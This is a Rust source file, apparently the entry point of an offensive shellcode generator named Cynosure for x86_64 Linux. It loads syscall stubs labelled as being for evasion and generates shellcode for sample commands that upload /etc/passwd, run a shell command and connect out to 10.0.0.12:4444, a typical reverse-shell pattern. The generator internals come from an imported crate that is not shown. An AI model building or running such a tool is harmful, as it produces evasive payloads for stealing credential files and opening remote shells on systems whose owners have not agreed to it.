//! Shellcode Generator - Main Entry Point
//! 
//! Generates x86_64 Linux shellcode from high-level commands.
//! Uses abstract syscall interface that falls back to direct calls when no stub available.

use cynosure_shellgen::{ShellcodeGenerator, ShellcodeStats};

fn main() {
    println!("=== Cynosure Shellcode Generator ===");
    
    // Create generator and register loaded modules from Cynosure
    let mut gen = ShellcodeGenerator::new();
    
    // Register stubbed syscalls (if available via module system)
    if let Ok(modules) = std::env::var("CYNO_SHELL_MODULES") {
        for m in modules.split(',') {
            let name = m.trim();
            gen.add_module(name);
        }
    }
    
    // Default stubbed syscalls (mprotect, mmap, prlimit64 for evasion)
    gen.add_module("stub_mprotect");
    gen.add_module("stub_mmap"); 
    gen.add_module("stub_prlimit64");
    
    println!("Loaded modules: {:?}", gen.get_stats().loaded_modules);
    
    // Example commands to generate shellcode for
    let example_commands = vec![
        "upload /etc/passwd",
        "exec ls -la",
        "connect 10.0.0.12:4444",
    ];
    
    println!("\n=== Generated Shellcode ===\n");
    
    for cmd in example_commands.iter() {
        match gen.generate_shellcode(cmd) {
            Ok(hex) => {
                println!("Command: {}", cmd);
                println!("Shellcode (hex): {}", hex);
                println!("Size: {} bytes\n", hex.len() / 2);
            }
            Err(e) => {
                eprintln!("Error generating for '{}': {}", cmd, e);
            }
        }
    }
    
    // Demonstrate stats
    let stats = gen.get_stats();
    println!("\n=== Generation Stats ===");
    println!("Total loaded modules: {}", stats.loaded_modules);
    println!("Stubbed syscalls used: {}", stats.stubbed_syscalls);
}
